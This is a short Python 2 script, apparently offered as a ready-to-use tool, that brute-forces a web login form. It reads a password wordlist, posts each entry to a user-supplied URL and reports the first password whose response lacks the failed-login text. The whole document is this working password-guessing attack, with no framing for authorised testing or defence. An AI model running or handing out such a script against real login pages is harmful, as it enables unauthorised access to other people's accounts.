import requests



#change post or get if get or post

#change username:name password:name and other param:name

class bc:

    OKGREEN = '\033[92m'

    RED = '\033[91m'

    BOLD = '\033[1m'



url = raw_input("\nUrl post: ")

ter = raw_input("Invalid login response: ")

pswd = raw_input("Enter password input name: ")

pwls = raw_input("Enter psw file [empty = psw.txt]: ").strip("' ") or "psw.txt"

psf = open(pwls, "r").readlines()



print("\n")

for j in psf:

 jb=j.strip()

 http = requests.post(url, data={pswd:jb})

 con = http.content

 if ter not in con:

  print bc.OKGREEN,bc.BOLD+("\n [*+*] Correct password: "+jb+"\n")

  break;

 else:

  print("[!!!] invalid password: "+jb)
